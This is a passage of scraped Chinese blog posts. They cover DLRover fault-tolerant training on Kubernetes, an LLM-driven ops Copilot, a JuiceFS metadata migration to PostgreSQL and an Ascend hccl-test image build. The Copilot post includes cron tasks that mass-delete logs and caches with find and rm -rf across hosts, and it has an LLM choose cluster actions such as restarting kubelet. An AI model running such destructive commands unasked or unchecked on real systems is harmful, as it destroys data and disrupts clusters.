为 cluster 时使用。 BrainService string `json:\u0026#34;brainService,omitempty\u0026#34;` // EnableElasticScheduling 启动 Pod 的弹性调度。 EnableElasticScheduling bool `json:\u0026#34;enableElasticScheduling,omitempty\u0026#34;` // EnableDynamicSharding 启动数据集的动态分片。 EnableDynamicSharding bool `json:\u0026#34;enableDynamicSharding,omitempty\u0026#34;` // 一个从 ReplicaType（类型）到 ReplicaSpec（值）的映射。指定训练集群的配置。 // 例如， // { // \u0026#34;PS\u0026#34;: ReplicaSpec, // \u0026#34;Worker\u0026#34;: ReplicaSpec, // } ReplicaSpecs map[commonv1.ReplicaType]*ReplicaSpec `json:\u0026#34;replicaSpecs\u0026#34;` // Envs 指定作业 Pod 的环境变量。 Envs map[string]*corev1.EnvVar `json:\u0026#34;envs,omitempty\u0026#34;` } 其中的 ReplicaSpec 定义如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 type ReplicaSpec struct { commonv1.ReplicaSpec `json:\u0026#34;,inline\u0026#34;` // RestartCount 是重新启动失败副本的次数。 RestartCount int `json:\u0026#34;restartCount,omitempty\u0026#34;` // AutoScale 是一个标志，用于自动调整副本数量和每个副本的资源。 AutoScale bool `json:\u0026#34;autoScale,omitempty\u0026#34;` // RestartTimeout 是等待挂起副本的时间。 RestartTimeout int `json:\u0026#34;restartTimeout,omitempty\u0026#34;` // Priority 支持 high/low/0.5。0.5 表示一半的工作节点具有高优先级， // 另一半工作节点具有低优先级。默认值为 low。 Priority string `json:\u0026#34;priority,omitempty\u0026#34;` } 下面对其中的一些关键字段进行说明。\n6.2 DistributionStrategy 策略 有两种 DistributionStrategy 策略：\nParameterServerStrategy 适用于使用 TensorFlow 的 parameter_server 作业，https://www.tensorflow.org/tutorials/distribute/parameter_server_training 。\nAllreduceStrategy 适用于 Horovod 的 ring-allreduce 和 PyTorch 的 DistributedDataParallel 作业。\n从这里可以看出，如果训练使用的是 PyTorch 就选 AllreduceStrategy，使用的是 TensorFlow 就选 ParameterServerStrategy。\nPyTorch DistributedDataParallel 的 Allreduce 策略下，预训练过程中会保持 Global Batch Size 固定，也就不需要增删节点，不涉及弹性训练，主要使用的是 Job Master 的容错自愈能力。\nTensorFlow parameter_server 的 ParameterServerStrategy 策略下，节点数可以调整，依赖 Brain 服务进行弹性训练。\n6.3 optimizeMode 模式 有三种 optimizeMode 模式:\nmanual 调试模式，修改正在运行的作业时，作业不会重启，用来探索更佳的作业参数配置。\nsingle-job 测试、快速验证的场景，不依赖额外的组件。使用 master 的内存存储历史的统计数据，如果主节点发生故障，历史统计数据会丢失。\ncluster 正式环境的训练，Bran 服务会将作业的历史统计数据持久化到数据库中，进行集群级别的优化。即使主节点发生故障时，DLRover 可以重启主节点继续训练。\n上面这段描述来自 DLRover 的设计文档。在测试时，发现 single-job\\cluster 模式在 AllreduceStrategy 下没有明显区别，cluster 模式在 Brain 不能用时也能正常运行。同时，AllreduceStrategy 下的 Job Master 发生故障时，整个作业就失败了。\n6.4 训练作业测试 创建 ElasticJob 对象 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: elastic.iml.github.io/v1alpha1 kind: ElasticJob metadata: name: torch-mnist-single-job-testing-1 namespace: dlrover labels: some-label: some-value spec: distributionStrategy: AllreduceStrategy optimizeMode: cluster replicaSpecs: worker: replicas: 5 template: spec: restartPolicy: Always containers: - name: main image: registry.cn-beijing.aliyuncs.com/intell-ai/dlrover:pytorch-example imagePullPolicy: Always command: - /bin/bash - -c - \u0026#34;dlrover-run --network-check --nnodes=1:10 \\ --nproc_per_node=1 --max_restarts=10 \\ examples/pytorch/mnist/cnn_train.py --num_epochs 500 \\ --training_data /data/mnist_png/training/ \\ --validation_data /data/mnist_png/testing/\u0026#34; resources: limits: cpu: 2 memory: 3Gi tencent.com/vcuda-core: 100 requests: cpu: 2 memory: 3Gi tencent.com/vcuda-core: 100 EOF 一旦 ElasticJob 创建完成，DLRover 会马上开始创建 master 和 worker Pod，并不会判断是否有足够的资源，没有 gang-scheduler 的支持。根据社区沟通，DLRover 会结合 Volcano 的 gang-scheduler 支持此特性。\n查看作业状态 1 2 3 4 5 6 7 8 9 kubectl -n dlrover get pod NAME READY STATUS RESTARTS AGE elasticjob-torch-mnist-single-job-testing-1-dlrover-master 1/1 Running 0 10s torch-mnist-single-job-testing-1-edljob-worker-0 1/1 Running 0 5s torch-mnist-single-job-testing-1-edljob-worker-1 1/1 Running 0 5s torch-mnist-single-job-testing-1-edljob-worker-2 1/1 Running 0 5s torch-mnist-single-job-testing-1-edljob-worker-3 1/1 Running 0 5s torch-mnist-single-job-testing-1-edljob-worker-4 1/1 Running 0 5s 主动删掉一个 worker 1 kubectl -n dlrover delete pod torch-mnist-single-job-testing-1-edljob-worker-3 查看作业状态 1 2 3 4 5 6 7 8 9 kubectl -n dlrover get pod NAME READY STATUS RESTARTS AGE elasticjob-torch-mnist-single-job-testing-1-dlrover-master 1/1 Running 0 6m18s torch-mnist-single-job-testing-1-edljob-worker-0 1/1 Running 0 6m13s torch-mnist-single-job-testing-1-edljob-worker-1 1/1 Running 0 6m13s torch-mnist-single-job-testing-1-edljob-worker-2 1/1 Running 0 6m13s torch-mnist-single-job-testing-1-edljob-worker-4 1/1 Running 0 6m12s torch-mnist-single-job-testing-1-edljob-worker-5 1/1 Running 0 3m12s DLRover 会自动拉起一个新的 worker 作业，继续训练任务，这就是其故障自动恢复的能力。当然，如果是其他故障，比如掉卡、程序异常退出、IO 异常等故障，DLRover 也可以自动处理，不需要人工干预。\n清理 1 kubectl -n dlrover delete elasticjob torch-mnist-single-job-testing-1 1 kubectl -n dlrover delete scaleplans.elastic.iml.github.io torch-mnist-single-job-testing-1 6.5 弹性作业原理 Allreduce 现在只支持容错，不支持弹性扩容。我们的目标场景是 PyTorch 的分布式预训练大模型，对 Tensorflow 相关的弹性没有强烈需求。这里仅仅只是简单了解下其弹性原理。\nDLRover Brain 会根据当前训练任务的监控，利用算法计算出资源优化需要调整的数据。训练作业的 Job Master 拿到新的资源优化结果后，会生成一个 ScalePlan CRD，通知 ElasticJob Controller 更改训练作业的节点规模。\n我测试过社区提供的 deepctr-auto-scale 示例，chief 占用了大量内存资源，并没有观察到 worker 副本数的增加。\n1 deepctr-auto-scale-edljob-chief-0 1947m 185022Mi 1 2 3 4 5 6 7 8 deepctr-auto-scale-edljob-chief-0 1/1 Running 0 4h42m deepctr-auto-scale-edljob-evaluator-0 1/1 Running 0 4h42m deepctr-auto-scale-edljob-ps-0 1/1 Running 0 4h42m dlrover-brain-78b6484859-p67s5 1/1 Running 0 16h dlrover-controller-manager-688c767cb7-8bzgl 2/2 Running 1 (7h43m ago) 15h dlrover-kube-monitor-88548c89f-kjjjw 1/1 Running 1 (16h ago) 16h elasticjob-deepctr-auto-scale-dlrover-master 1/1 Running 0 4h42m mysql-574fb78ddb-8l79r 1/1 Running 0 16h 同时，这个作业依赖于 /nas 中的数据，文档中也没有给出配置说明，因此没有测试太多。\n7. 一些问题 master 挂了之后，训练会停止 1 kubectl -n dlrover delete pod elasticjob-torch-mnist-single-job-testing-1-dlrover-master 之后\n1 dlrover-controller-manager-6b6f9dcd88-2h2fs 1/2 CrashLoopBackOff 4 (35s ago) 58m dlrover-controller-manager CrashLoopBackOff 的概率还挺高。等待一会儿，作业也会全部失败。\n1 2 3 4 5 torch-mnist-single-job-testing-1-edljob-worker-0 0/1 Error 0 112s torch-mnist-single-job-testing-1-edljob-worker-1 0/1 Error 0 112s torch-mnist-single-job-testing-1-edljob-worker-2 0/1 Error 0 112s torch-mnist-single-job-testing-1-edljob-worker-3 0/1 Error 0 112s torch-mnist-single-job-testing-1-edljob-worker-4 0/1 Error 0 112s ElasticJob 对象缺失非关键字段时，Worker 无法创建 不设置 spec.template.spec.restartPolicy 字段时，仅创建了 Job Master，而不会创建 Worker。在 ElasticJob Manager 和 Job Master Pod 的日志中看不到异常报错。\n不设置作业 ElasticJob 的 labels 字段，也是这种情况。\n版本控制做得不好，可能触发很多潜在问题 在 Release 的版本中，镜像 Tag 还是 test、master，拉取策略是 Always。文档中的一些测试 Case 也没有太多版本控制，很容易触发兼容性问题。\n还有就是 DLRover master 的 Dockerfile 中使用的 0.3.6 ，而 pytorch-example 中使用的是 0.3.4。\n项目完成度可能不是很高 我看到 EnableElasticScheduling 字段很快就联想到了 autoScale 字段，但是发现只有这个字段的定义，代码仓库中没有相关的实现。\n可能是开源的同学支持内部压力大，没太多时间打磨社区版这些细节，有些包名还没来得从 EasyDL 改为 DLRover。\n8. 总结 本篇是测试 DLRover 托管训练作用的一些记录，主要内容如下:\n在 Kubernetes 上进行训练，有其特定场景的问题需要解决，分布式训练任务形态类似 StatefulSet，节点（Pod) 之间不是完全对等 DLRover 能解决分布式训练时的一些问题，包括资源的配置，弹性训练，故障的检测、定位、恢复。 在主机和 Kubernetes 基础设施上分别对 DLRover 进行了尝试 目前 DLRover 项目还有些不完善的地方，但也给了我们共同参与的机会，希望项目能够走得远一点 ","description":"","id":34,"section":"post","tags":["博文","DLRover","训练","Kubernetes","弹性训练","容错训练"],"title":"使用 DLRover 托管作业进行弹性、容错训练","uri":"https://www.chenshaowen.com/blog/use-dlrover-to-manage-training-job.html"},{"content":" 本篇内容主要来自内部的一次分享，也是最近工作的一些总结。\n1. 常见的故障处理流程 如上图是一次典型的运维异常处理流程。\n按照时间线，有如下关键时间点:\n发生故障 发现故障 响应故障 定位故障 恢复故障 发生故障到发现故障，指的是被系统检测到，主要涉及到指标的采集周期、检测周期。如果按照 15 s 的采集周期，检测周期为 1 min，那么发现故障需要时间级别就是几十秒到几分钟级别。\n发现故障到响应故障指的是，接收到告警之后，人开始着手处理的时间。白天、晚上的区别就很大，白天工作时间段和非工作时间段区别也很大。晚上，大家都在休息，可能几个小时都没人响应告警；而在白天，运维人员在工作时间段分钟级别就能快速切入，开始定位故障。\n响应故障到定位故障指的是，要找出故障的原因。这部分的时间与人的经验、能力密切相关，入职不久的新人，可能得几个小时都不一定能定位到故障；而熟悉基础设施的老运维，可能几分钟就能快速找到问题所在。\n定位故障到恢复故障指的是，要修复故障，恢复线上的 SLO。这部分和上面的一部分类似，但对人的能力要求不同，比如程序有 Bug，运维能快速定位故障，但修复还是得研发同学介入。\n整体上就是这五个环节，四个时间段，其实后面还需要对 SLO 进行观测、复盘、优化、混沌实验验证等，但不涉及处理故障的流程。\n2. 大模型能参与的环节 如上图，按照我的分析主要在四个时间点可以介入，分别是发现故障、响应故障、定位故障、处理故障。\n2.1 发现故障 发现故障时，人还没来得及响应。\n如果大模型能够自动介入，响应告警，能获得最快的响应速度，获得最大的收益，极大缩短平均故障处理时间 MTTF。\n但发现故障时，立即让大模型介入也是最难的。难点就在于，需要开发一个 AI Agent 自动的响应告警信息，自动的收集观测的指标，自动调用平台接口，甚至登录机器尝试处理故障，验证是否被修复了，循环往复。\n如果你写过代码或者智能体就会知道，这件事挺难的，而如果你觉得很简单，可能就是高估了大模型的智能水平，低估了现实问题的复杂度。\n2.2 响应故障 响应故障时，大模型如果能立即对故障进行初步的分析，缩小故障的处理范围有利于加快定位故障的速度。\n大模型预分析，依赖于平时的故障处理资料，这需要我们在每次发生故障时，详细地记录和分析故障的各个方面。\n只有具备足够的故障数据根因数据积累，才能有效借助大模型缩小故障范围。\n2.3 定位故障 现在的可观测性又扩充了，新增了事件，加上之前的监控指标、日志、链路，数据源是多了，但是每次定位故障时，需要查询的平台也多了。\n大模型可以帮我们有效缩短查询这些可观测性指标的时间。\n同时，根据一些关键字，还能检索文档库，分析故障原因，给出一些修复方案，节省我们上网检索的时间。\n2.4 处理故障 大模型也可以用来直接处理故障。\n回忆一下，我们经常是怎么处理故障的。重启一下 Deployment、重启一下 Kubelet、调整一下路由配置、换一个节点试试等。这些通常就是一条命令、一次接口调用、一次按钮点击。\n让大模型帮我们执行这些操作，非常省时省事儿。\n2.5 小结 大模型能够参与的环节其实很多，但从难易程度上看，大模型越早介入难度越大，越晚介入易于实现。\n故障早期涉及的范围太大，大模型难以有效捕获到故障的关键根因，而人的经验、灵活性、自主学习能力会体现出优势。\n最终落地大模型却要反着来，先用大模型介入后期的处理，逐步积累相关的文档和案例，再将介入的时间点往前推移，直至能够完全实现 AI Agent 自动化的响应故障。\n3. 使用大模型处理故障时的挑战点 3.1 文本如何转换为运维操作 我们熟知的大模型服务，典型的输入和输出都是文本、图片、视频。\n如果将这些静态的输出，转换为一个具体的操作，一个命令的执行，一个运维的操作，这是我们首先要面对的问题。\n3.2 大模型提取的信息不稳定 对于程序来说，确定性是非常重要的，但大模型的魅力就是不确定性、多样性。着手开始写大模型应用很容易遇到这些问题:\n大模型不理解意图，频繁道歉 输出的格式不对 输出的参数缺失 \u0026hellip; 类似的问题会有很多，我们通常会从以下几个方面破局:\n提示词 重试 微调模型 当然，这次我想提的另外一个关键点，从应用设计的层面来解决。\n3.3 怎么快速接入场景 快速验证、快速迭代应该深入每个工程师的基因中。怎样快速对接上各种场景，让我们的方案看起来不那么离谱，甚至感觉有点效果很重要。\n这里我选的就是日常的一些琐事:\n处理告警事件 辅助日常运维 但这两大类事情的子项非常多，几十种，甚至上百种场景，我想到的是插件编排的思路。如果能抽象出原子操作，拼接原子构成流水线，就能够覆盖无数种场景。\n4. 落地关键技术 - Ops 简介 每个领域可能都需要一个类似 Ops 的项目，提供大模型驱动领域的能力。下面对 Ops 进行简单介绍。\nOpsObject 通过 CRD 存储操作对象，管理集群、主机对象。\nCore 核心操作，实现文件分发和脚本执行的能力。\nTask 封装、组合各种操作，轻量级的编排能力。\nTools 对外提供三种操作入口\nOps 项目是对接运维能力的关键。我之前的文章中已经多次介绍，感兴趣的话可以前往 https://www.chenshaowen.com/ops/ 查看详情。\n4.1 使用示例 - 查看对象 查看运维对象 可以看到集群的节点数、证书过期剩余天数等关键信息。\n可以看到节点配置、GPU 卡的亚实时状态。\n4.2 使用示例 - Opscli shell 用于在主机上执行脚本 file 用于在主机与 S3、文件服务、镜像之间传输文件 task 用于编排多个 shell\\file 操作 支持仅提供 kubeconfig 凭证，在指定节点上执行命令 也支持 Kubectl 中的 SA 鉴权 4.3 使用示例 - Web UI 通过更简单的方式使用 Ops 的核心能力:\nServer 提供接口能力 Web 有提供一个简单管理的 UI 4.4 使用示例 - Task Task 提供模板的能力，只需要先定义一个任务。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 apiVersion: crd.chenshaowen.com/v1 kind: Task metadata: name: cron-clear-disk namespace: ops-system spec: desc: cron to create clear disk selector: managed-by: ops typeRef: host steps: - name: clear \u0026gt; 100M log content: find /var/log -type f -name \u0026#34;*.log\u0026#34; -size +100M -exec rm -f {} \\; 2\u0026gt;/dev/null || true - name: clear jfs cache content: | find /data/jfs/cache2/mem -maxdepth 1 -type d -atime +15 -exec rm -rf {} + 2\u0026gt;/dev/null || true find /var/lib/jfs/cache -maxdepth 1 -type d -atime +15 -exec rm -rf {} + 2\u0026gt;/dev/null || true find /var/lib/jfs/cache2 -maxdepth 1 -type d -atime +15 -exec rm -rf {} + 2\u0026gt;/dev/null || true 接着在 TaskRun 中引用这个任务就能够执行。\n1 2 3 4 5 6 7 apiVersion: crd.chenshaowen.com/v1 kind: TaskRun metadata: name: cron-clear-disk namespace: ops-system spec: ref: cron-clear-disk 5. Copilot 的设计 Copilot 是我们目前落地大模型处理运维故障的主要形态。通过交互对话的方式，让大模型参与到故障处理的过程中，按照前面的思路，先介入故障处理的后期，再落地前期，采用逐层积累、推进的策略。\n5.1 关键步骤 核心的思路:\n通过 Ops 项目对 Copilot 提供运维的操作能力 通过流水线 pipeline 提供操作场景对接能力 核心的步骤:\n第一步，大模型帮我们选择一条流水线\n第二步，大模型帮我们从故障的上下文中提取运行流水线的参数\n这与 function_call 的功能类似，只不过调用的不是 function 而是 pipeline。使用 pipeline 对接场景的好处多多，不仅能够处理更加复杂的任务，还能不被模型功能限制。\n目前只要支持 OpenAI 接口的大模型，都能够对接上 Copilot 的 pipeline。只不过由于没有经过运维故障处理领域的微调，使用的模型参数量不能太少，对理解能力有一定要求。\n5.2 流水线的设计 流水线的设计目标是：\n便于大模型识别意图，选中一条流水线执行 便于扩展，覆盖更多场景 便于大模型自行组装 tasks 形成新的 pipeline，为实现 AI Agent 提供可行路径 我很熟悉 CICD 等编排系统，很容易就用代码写出这个 pipeline 对象和具体执行逻辑。\n目前已经定义了:\ntask 95 个 pipeline 20 个 同时，由于 task、pipeline 都是 CR 对象，只需要编写 Yaml 就能够快速对接场景，十分方便。\n最终提交给大模型的输入是这样:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 Please select the most appropriate option to classify the intention of the user. Don\u0026#39;t ask any more questions, just select the option. Must be one of the following options: - xxx-es-log-analysis(Analysis - xxx ES日志分析告警过去20秒异常日志超过阈值) - xxx-grafana-alert-node-disk-pressure(Analysis - 节点异常NodeDiskPressure) - xxx-grafana-alert-pod-crashloopbackoff(Analysis - xxx Grafana告警Pod处于CrashLoopBackOff状态持续超过1分钟) - xxx-grafana-alert-pod-error-request(Analysis - xxx Grafana告警Pod异常请求比例大于10%) - xxx-grafana-alert-pod-pending(Analysis - xxx Grafana告警 Pod处于Pending状态持续超过十分钟) - xxx-grafana-alert-pod-restart(Analysis - xxx Grafana告警Pod重启次数大于2) - xxx-grafana-node-status(Analysis - xxx Grafana告警 （平台）节点状态不可用) - cluster-clear-disk(磁盘使用率超过阈值时清理磁盘) - cluster-cordon-node(禁用\\屏蔽集群中的某个节点) - cluster-restart-pod(重启、删除集群中的某一个 Pod) - cluster-uncordon-node(恢复集群中的某一个节点) - collect-gpu-log(Collect - 搜集 GPU 的相关日志) - get-pod(查看 Pod 信息、状态) - grafana-alert-pod-restart(Analysis - xxx Grafana告警 Pod 重启次数大于2) - list-clusters(列出、查看所有的集群, 哪些指令、功能) - list-nodes(查看、列出某个集群的所有节点) - list-pipelines(查看、列出所有的流水线) - restart-containerd(重启 containerd) - restart-fabricmanager(重启 fabricmanager) - restart-kubelet(重启 kubelet) 5.3 变量的设计 变量的设计如此重要，只有当你真正写过大模型应用时，才会由此体会。\n首先是参数的定义:\n默认值 描述 正则 是否必须 枚举 示例 固定值 接着是参数的优先级:\ntask 固定值 pipeline 固定值 运行提取值 通过变量的设计，我们可以获得如下好处:\n通过变量定义提高抽参数准确性 task 固定值提高执行成功率\ne.g.只运行在 master 节点 pipeline 固定值提供敏感信息\ne.g. 上传 S3 的 ak\\sk 值 下面是我提交给大模型的输入:\n1 2 3 4 5 The cluster-clear-disk pipeline is used to 磁盘使用率超过阈值时清理磁盘. It requires the following parameters(if enum provided, choose one of them): - nameRef {\u0026#34;required\u0026#34;:true,\u0026#34;enums\u0026#34;:[\u0026#34;cluster-1\u0026#34;,\u0026#34;cluster-2\u0026#34;,\u0026#34;cluster-3\u0026#34;,\u0026#34;cluster-4\u0026#34;,\u0026#34;cluster-5\u0026#34;]} - nodeName {\u0026#34;regex\u0026#34;:\u0026#34;\\b[a-zA-Z-]*node[a-zA-Z-]*\\b\u0026#34;,\u0026#34;required\u0026#34;:true} - typeRef {\u0026#34;value\u0026#34;:\u0026#34;cluster\u0026#34;,\u0026#34;required\u0026#34;:true} 6. 主动发现故障，让飞轮转起来 如果只是被动等待故障，要到猴年马月才能积累足够的数据，最好的办法永远是主动出击。\n巡检能够主动的发现一些潜在问题，在故障发生之前，提前预警。\n目前我们的巡检已经涉及多个方面，设备层、驱动层、系统层等。新加入集群的节点也可以自动加入巡检中。\n巡检的配置也非常简单，还记得上面的 TaskRun 对象吗。\n1 2 3 4 5 6 7 8 apiVersion: crd.chenshaowen.com/v1 kind: TaskRun metadata: name: cron-clear-disk namespace: ops-system spec: crontab: 0 0 * * * ref: cron-clear-disk 只需要在 TaskRun 中加上 crontab: 0 0 * * * 就可以开始周期性的执行了，这个示例中就是每天八点清理磁盘。而巡检任务只需要在 Task 中写了一些巡检的逻辑，并触发告警通知、推送预警事件即可。\n7. 典型案例 可能上面提到很多内容，还缺少一个直观的感受，下面我就来介绍一个典型的案例。\nAI 加速卡工作在高温环境中，经常会有各种异常和报错。不同于 CPU 会大幅降频自我保护，AI 加速卡会掉卡（系统层、驱动层识别不了硬件的状态），直接无法使用。千卡训练，平均每天至少一张卡异常。\n当 GPU 掉卡时，就需要报修，让云厂的工程师在现场解决，下面是传统的报修流程。\n现在只需要在 IM 中 at Copilot 就行。\n处理时间从几十分钟减少到了几分钟，同时也增强的安全性，避免 AK/SK 信息泄露。\n除了这个在流程、时间上能极大提高效率的案例之外，我还比较看中的是，现在处理故障不受时间、是否能远程办公等条件约束，随时随地都能处理。\n8. 总结 本篇介绍了我在使用大模型处理运维故障的一些实践，希望对大家设计和开发大模型应用有所帮助。主要内容如下:\n故障处理流程的时间线以及大模型能参与的环节 大模型几乎能参与全部的故障处理环节，包括故障的发现、响应、定位、处理 着手使用大模型处理故障时，可以从距离解决故障最近的环节开始，逐步向前推进 如果你也在从事运维相关的工作，可以试试 https://github.com/shaowenchen/ops 项目 function_call 是一种思路，不要局限在 function 还可以是 pipeline、workflow 等任意可编程对象 开发大模型应用时，对变量的描述极其重要 ","description":"","id":35,"section":"post","tags":["博文","大模型","运维","异常","故障","分享"],"title":"开发了一个 Copilot 用来处理运维故障","uri":"https://www.chenshaowen.com/blog/develop-a-copilot-to-handle-exceptions.html"},{"content":"1. 为什么将元数据存储从 Redis 迁移到 PGSQL PGSQL 成本低 Redis 使用内存存储元数据，PGSQL 使用磁盘存储元数据，成本差异显而易见。\nPGSQL 性能可调节 不同的 PGSQL 提供了不同的性能 IOPS。如果对性能没有持续高的要求，使用 PGSQL 是不错的选择。\nPGSQL 存储上限更高 如果按照元数据大小估算应该更准确，但我更喜欢用的公式是: 元数据的大小 * 2000 = 存储的大小。也就是 200TB 的数据，需要一个 100GB 的 Redis 实例。而目前我们常用的云厂最大的主从 Redis 实例只有 96GB，无法满足存储需求。\n使用 Redis 集群有一个坑是，Juicefs 只会使用一个 Redis 集群节点存储元数据，其他节点的资源无法使用。\n而使用 PGSQL 的实例可以提供 TB 级别的存储，Juicefs 单实例可以容纳 PB 级别的数据。\n2. 从 Redis 导出元数据 配置环境变量 1 2 3 4 export REDIS_PASSWORD= #ip:port/database export REDIS_ENDPOINT= export META_SERVER=redis://:$REDIS_PASSWORD@$REDIS_ENDPOINT 导出元数据 1 2 3 4 juicefs dump $META_SERVER meta-redis.json Dumped entries: 25334296/25752607 [============================================================\u0026gt;-] 17909.7/s ETA: 23s juicefs[3287398] \u0026lt;INFO\u0026gt;: Dump metadata into meta-redis.json succeed [dump.go:107] 等待导出完毕。\n3. 将元数据导入到 PGSQL 配置环境变量 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 export ACCESS_KEY= export SECRET_KEY= export BUCKET= export ENDPOINT=ks3-cn-beijing-internal.ksyun.com export BUCKET_ENPOINT=$BUCKET.$ENDPOINT export PROVIDER=ks3 export NAMESPACE= export PVC_NAME= export NODE_SELECTOR_KEY= export NODE_SELECTOR_VALUE= export JUICEFS_IMAGE=juicedata/juicefs-fuse export DEMO_IMAGE=shaowenchen/demo-ubuntu export POSTGRES_USER=admin export POSTGRES_PASSWORD= export POSTGRES_IP= export POSTGRES_PORT=5432 export POSTGRES_DB= export META_SERVER=postgres://$POSTGRES_USER:$POSTGRES_PASSWORD@$POSTGRES_IP:$POSTGRES_PORT/$POSTGRES_DB?sslmode=disable 创建数据库 1 psql -U $POSTGRES_USER -h $POSTGRES_IP -p $POSTGRES_PORT -d postgres -c \u0026#34;CREATE DATABASE $POSTGRES_DB;\u0026#34; 导入元数据 1 2 3 4 juicefs load $META_SERVER meta-redis.json juicefs[3315492] \u0026lt;WARNING\u0026gt;: Secret key was removed; please correct it with `config` command [load.go:138] juicefs[3315492] \u0026lt;INFO\u0026gt;: Load metadata from meta-redis.json succeed [load.go:143] 配置存储桶秘钥 1 juicefs config --secret-key $SECRET_KEY $META_SERVER 在集群配置 JuiceFS 的过程可以参考，在 Kubernetes 下创建后端为 JuiceFS 的 PVC\n4. 性能测试 最后使用默认参数测试了下，看起来速度也还行，在可以接受的范围:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 juicefs bench . +------------------+------------------+---------------+ | ITEM | VALUE | COST | +------------------+------------------+---------------+ | Write big file | 408.04 MiB/s | 2.51 s/file | | Read big file | 232.10 MiB/s | 4.41 s/file | | Write small file | 11.0 files/s | 91.25 ms/file | | Read small file | 21.9 files/s | 45.61 ms/file | | Stat file | 144.2 files/s | 6.94 ms/file | | FUSE operation | 17912 operations | 1.48 ms/op | | Update meta | 1228 operations | 9.88 ms/op | | Put object | 356 operations | 114.92 ms/op | | Get object | 356 operations | 55.30 ms/op | | Delete object | 0 operations | 0.00 ms/op | | Write into cache | 0 operations | 0.00 ms/op | | Read from cache | 0 operations | 0.00 ms/op | +------------------+------------------+---------------+ ","description":"","id":36,"section":"post","tags":["博文","JuiceFS","Redis","PGSQL","运维"],"title":"将 JuiceFS 元数据从 Redis 迁移到 PGSQL","uri":"https://www.chenshaowen.com/blog/migrate-juicefs-metadata-from-redis-to-pgsql.html"},{"content":"1. 制作 hccl-test 镜像 下载依赖包 Python-3.8.18.tgz\nAscend-cann-toolkit_8.0.RC2_linux-x86_64.run\nAscend-cann-kernels-910b_8.0.RC2_linux.run\nmpich-3.2.1.tar.gz\n如果不方便下载，也可以直接从我打包的镜像中拷贝出来。\n编写 Dockerfile 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 FROM ubuntu:22.04 WORKDIR /home RUN sed -i -e \u0026#39;s/^APT/# APT/\u0026#39; -e \u0026#39;s/^DPkg/# DPkg/\u0026#39; /etc/apt/apt.conf.d/docker-clean RUN apt-get update \u0026amp;\u0026amp; apt-get install -y apt-transport-https tzdata openssh-server # Install base library RUN apt-get install -y gcc g++ make cmake zlib1g zlib1g-dev openssl libsqlite3-dev libssl-dev libffi-dev libbz2-dev libxslt1-dev unzip pciutils net-tools libblas-dev gfortran libblas3 liblzma-dev git wget zip vim gnutls-bin # Install Python3.8.18 COPY Python-3.8.18.tgz . RUN tar -zxvf Python-3.8.18.tgz \\ \u0026amp;\u0026amp; cd Python-3.8.18 \\ \u0026amp;\u0026amp; chmod +x ./configure RUN cd Python-3.8.18 \u0026amp;\u0026amp; ./configure --prefix=/usr/local/python3.8.18 --enable-loadable-sqlite-extensions --enable-shared --enable-optimizations RUN cd Python-3.8.18 \u0026amp;\u0026amp; make -j16 \u0026amp;\u0026amp; make install RUN cd /home \\ \u0026amp;\u0026amp; ln -s /usr/local/python3.8.18/bin/pip3 /usr/bin/pip \\ \u0026amp;\u0026amp; ln -s /usr/local/python3.8.18/bin/python3 /usr/bin/python ENV LD_LIBRARY_PATH=/usr/local/python3.8.18/lib:$LD_LIBRARY_PATH ENV PATH=/usr/local/python3.8.18/bin:$PATH # Install ascend-toolkit \u0026amp; kernels COPY Ascend-cann-toolkit_8.*.run . COPY Ascend-cann-kernels-910b_8.*.run . RUN ./Ascend-cann-toolkit_8.*.run --install --quiet RUN ./Ascend-cann-kernels-910b_8.*.run --install --quiet RUN echo \u0026#34;source /usr/local/Ascend/ascend-toolkit/set_env.sh\u0026#34; \u0026gt;\u0026gt; ~/.bashrc # Set Env ENV TOOLKIT_PATH=/usr/local/Ascend/ascend-toolkit/latest ENV LD_LIBRARY_PATH=/usr/local/Ascend/driver/lib64/driver/:$LD_LIBRARY_PATH ENV GLOG_v=2 \\ LD_LIBRARY_PATH=$TOOLKIT_PATH/lib64:$LD_LIBRARY_PATH \\ TBE_IMPL_PATH=$TOOLKIT_PATH/opp/op_impl/built-in/ai_core/tbe \\ PATH=$TOOLKIT_PATH/ccec_compiler/bin:$PATH \\ ASCEND_OPP_PATH=$TOOLKIT_PATH/opp \\ ASCEND_AICPU_PATH=$TOOLKIT_PATH ENV PYTHONPATH=$TBE_IMPL_PATH:$PYTHONPATH ENV LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/mpich-3.2.1/lib:$TOOLKIT_PATH/lib64:$TOOLKIT_PATH/x86_64-linux/devlib # Install hccl_test COPY mpich-3.2.1.tar.gz . RUN umask 0022 \u0026amp;\u0026amp; \\ tar -zxvf mpich-3.2.1.tar.gz \u0026amp;\u0026amp; \\ cd mpich-3.2.1 \u0026amp;\u0026amp; \\ ./configure --disable-fortran --prefix=/usr/local/mpich-3.2.1 \u0026amp;\u0026amp; \\ make \u0026amp;\u0026amp; \\ make install \u0026amp;\u0026amp; \\ cd $TOOLKIT_PATH/tools/hccl_test \u0026amp;\u0026amp; \\ make MPI_HOME=/usr/local/mpich-3.2.1 ASCEND_DIR=$TOOLKIT_PATH/x86_64-linux ENV PATH=$PATH:/usr/local/mpich-3.2.1/bin:$TOOLKIT_PATH/tools/hccl_test/bin 编译 hccl-test 镜像 1 docker build -t hubimage/hccl-test:8.0.RC2-ubuntu22.04 -f Dockerfile . 推送 hccl-test 镜像 1 docker push hubimage/hccl-test:8.0.RC2-ubuntu22.04 2. 运行 Volcano Job 给测试节点打上标签 1 2 3 kubectl label node ascend-910b-01 hccl-test=true kubectl label node ascend-910b-02 hccl-test=true kubectl label node ascend-910b-03 hccl-test=true 创建 Volcano Job 1 2 export HCCL_TEST_IMAGE=hubimage/hccl-test:8.0.RC2-ubuntu22.04 export HCCL_TEST_NODES=3 1 2 3 4 